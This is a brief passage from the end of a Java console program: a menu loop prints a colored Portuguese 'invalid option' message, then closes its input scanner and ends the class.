                System.out.println(R + "❌ Opção inválida" + W);
            }
        }
        
        scanner.close();
    }
}